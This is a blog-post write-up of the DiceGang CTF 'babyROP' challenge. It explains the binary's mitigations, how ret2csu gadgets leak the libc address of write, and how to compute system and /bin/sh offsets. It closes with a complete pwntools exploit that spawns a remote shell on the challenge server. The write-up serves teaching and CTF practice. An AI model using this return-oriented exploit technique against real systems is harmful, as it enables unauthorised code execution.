---
layout: post
author: tourpran
title: babyROP | DiceGang CTF
categories: writeup
tags: [csu, ret2csu, dicegang]
---

## Challenge Description
![](/assets/images/challdesbabyrop.png)

### Solution:

* Checkout the mitigations of the binary
* Try to find gadgets since this is a ROP challenge. If you dont know much about ROP checkout [ROPemporium](https://ropemporium.com/).
* Craft the payload to get flag from server.

#### Mitigations:
![](/assets/images/mitigationdice.png)
* We can't excecute shellcode (NX Enabled)
* No Canary found - no need for brute force or leaks
* PIE disabled - the address of the binary wont be randomised

#### Finding Gadgets:

Install ROPgadget to find all the gadgets in the binary.
```bash
ROPgadget --binary babyrop
```
My first thought was to ``write`` the address pointed by the got of ``write``. The idea was to leak the address of write function. Since write has already been called by the program the GOT of write will be populated and the got will point to the libc address of write. The following gadgets are needed. 
```asm
pop rdi
pop rsi 
pop rdx
```
I did not have the pop rdx register which makes the challenge a bit more intresting. So we need to find a way to set the value of RDX, RSI, RDI. 
```asm
rsi - point to the buffer [write@got]
rdi - file discriptor = 1
rdx - size of the buffer = >8
```

Since ropgadget did not give me the gadget I went to look for more gadgets in the `__libc_csu_init`. There I could find all the gadgets I wanted. 

#### Crafting Exploit: 

These are the important gadgets I want.

![](/assets/images/gadgetsdice.png)

#### Idea 

First overflow the buffer with garbage and then make return jump to csu. Things to note.

```asm
0x00000000004011b0 <+64>:	mov    rdx,r14
0x00000000004011b3 <+67>:	mov    rsi,r13
0x00000000004011b6 <+70>:	mov    edi,r12d

0x00000000004011ca <+90>:	pop    rbx
0x00000000004011cb <+91>:	pop    rbp
0x00000000004011cc <+92>:	pop    r12
0x00000000004011ce <+94>:	pop    r13
0x00000000004011d0 <+96>:	pop    r14
0x00000000004011d2 <+98>:	pop    r15
0x00000000004011d4 <+100>:	ret 
```

Now we can control the RDI, RSI, RDX because we can control the r14, r13, r12 registers. Intresting area was the call to `QWORD PTR [r15+rbx*8]` inbetween these gadgets. So we decided to make this `QWORD PTR [r15+rbx*8]` as the write function. In order to do this well set r15 as the address to write@got and rbx as 0. 

```asm
0x00000000004011b9 <+73>:	call   QWORD PTR [r15+rbx*8]
0x00000000004011bd <+77>:	add    rbx,0x1
0x00000000004011c1 <+81>:	cmp    rbp,rbx
0x00000000004011c4 <+84>:	jne    0x4011b0 <__libc_csu_init+64>
```
Hmmm :(. Seems like there is a compare statement that'll make us jump back to the csu+64 (which is somewhere in the middle of csu). Now lets make rbp as 1 so we dont take the jump.

```python
buf = b"a"*72
buf += p64(0x00000000004011ca) #rbx rbp r12 r13 r14 r15
buf += p64(0)+p64(1)+p64(1)+p64(elf.got['write'])+p64(8)+p64(elf.got['write'])
buf += p64(0x00000000004011b0)
buf += p64(0)*7
buf += p64(elf.sym['main'])
```

Exploit for leaking libc write address looks something like this. :) Now lets just recv the leak and see what libc they are using. To find out their libc go to [libc.blukat.me](https://libc.blukat.me/)

![](/assets/images/blukatdice.png)

Now its basic math, since all the address in the libc will be at the same offset from one another. Once you get the leak just find address of /bin/sh and system then just call system with /bin/sh as argument. Pretty intresting challenge and fun to solve :).

Anyway here is the exploit script for this challenge.

```python
#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './babyrop'

elf = ELF("./babyrop")

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = remote("dicec.tf", 31924)

# shellcode = asm(shellcraft.sh())

'''
0x00000000004011d3 : pop rdi ; ret

write syscall 
rdi = 1
rsi = pointer to puffer (pointer to write function)
rdx = size
'''

p.recvuntil(": ")

buf = b"a"*72
buf += p64(0x00000000004011ca) #rbx rbp r12 r13 r14 r15
buf += p64(0)+p64(1)+p64(1)+p64(elf.got['write'])+p64(8)+p64(elf.got['write'])
buf += p64(0x00000000004011b0) 
buf += p64(0)*7
buf += p64(elf.sym['main'])
p.sendline(buf)

# log.info("write leak: {}".format((hex(u64(p.recv(8))))))

leak = int(hex(u64(p.recv(8))), 16)
log.info("Write leak: {}".format(hex(leak)))

sys = leak-0xbbdc0

binsh = leak+0xa63da

buf = b"a"*72
buf += p64(0x40116b) #ret
buf += p64(0x00000000004011d3) #pop rdi 
buf += p64(binsh)
buf += p64(sys)

p.sendline(buf)

p.interactive()


```